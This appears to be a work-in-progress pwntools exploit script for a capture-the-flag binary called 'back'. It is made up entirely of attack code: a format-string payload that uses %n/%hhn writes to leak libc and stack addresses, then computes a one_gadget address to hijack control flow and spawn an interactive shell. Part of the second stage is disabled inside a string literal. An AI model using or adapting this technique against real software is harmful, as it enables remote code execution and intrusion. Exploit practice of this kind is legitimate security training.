from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})

payload = "%81x"+"%c"*7 + "%hhn" + "%52x"+"%7$hhn%17$p%14$p"

gdb.attach(io)#,"b*0x555555554a13\nc\n")
io.recvuntil("> ")
io.send(payload)
"""
io.recv(92)

leak = int(io.recv(14),16)-0x21b97
one = leak + 0x10a45c
val = one&0xffffffff

first = val&0xffff
second = (val&0xffff0000) >> 16

stack_leak = int(io.recv(14),16)
stack_val = stack_leak&0xffff
stack_val = stack_val - 214

log.info("One gadget at "+str(hex(one)))
log.info("stack at "+str(hex(stack_leak)))

log.info("first "+str(first))
log.info("second "+str(second))
log.info("stack_val "+str(stack_val))

#if(not(first < stack_val and first+stack_val < second)):
#    exit(0)
payload = "%113x"+"%c"*7 + "%hhn"+ "%"+str(first-113-7)+"x"+"%7$n" + "%"+str(stack_val-7-first)+"x" + "%c"*7 + "%hn" #+ "%"+str(second-stack_val)+"x"+"%c"*(45-21) +"%hn"
print(len(payload))
io.recvuntil("> ")
io.send(payload)

"""
io.interactive()
